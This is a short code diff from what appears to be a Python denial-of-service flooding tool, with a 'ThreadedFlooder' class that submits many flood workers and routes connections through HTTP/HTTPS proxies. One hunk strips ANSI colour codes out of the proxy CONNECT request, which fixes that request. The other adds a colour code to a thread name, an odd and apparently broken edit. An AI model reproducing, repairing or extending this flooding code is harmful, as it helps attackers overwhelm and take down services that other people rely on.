@@ -196,8 +196,8 @@ def create_connection(target: ParseResult, proxy: Optional[ProxyTuple], proxy_ty
         elif proxy_type in ['http', 'https']:
             sock = socket.create_connection((proxy.host, proxy.port), timeout=CONNECT_TIMEOUT)
             if use_ssl:
-                connect_str = f"\033[36mCONNECT {target_host}:{target_port} HTTP/1.1\r\n"
-                connect_str += f"\033[36mHost: {target_host}:{target_port}\r\n\r\n"
+                connect_str = f"CONNECT {target_host}:{target_port} HTTP/1.1\r\n"
+                connect_str += f"Host: {target_host}:{target_port}\r\n\r\n"
                 sock.sendall(connect_str.encode('utf-8'))
                 sock.settimeout(READ_WRITE_TIMEOUT)
                 response = sock.recv(4096)
@@ -415,7 +415,7 @@ class ThreadedFlooder:
         self.start_time = time.time()
         signal.signal(signal.SIGINT, self._signal_handler)
         signal.signal(signal.SIGTERM, self._signal_handler)
-        self.stats_thread = threading.Thread(target=self.stats_reporter, name="StatsReporter", daemon=True)
+        self.stats_thread = threading.Thread(target=self.stats_reporter, name="\033[36mStatsReporter", daemon=True)
         self.stats_thread.start()
         futures = [self.executor.submit(self.flood_task) for _ in range(self.num_workers)]
         logger.info(f"\033[32m{len(futures)} worker tasks submitted to ThreadPoolExecutor.")
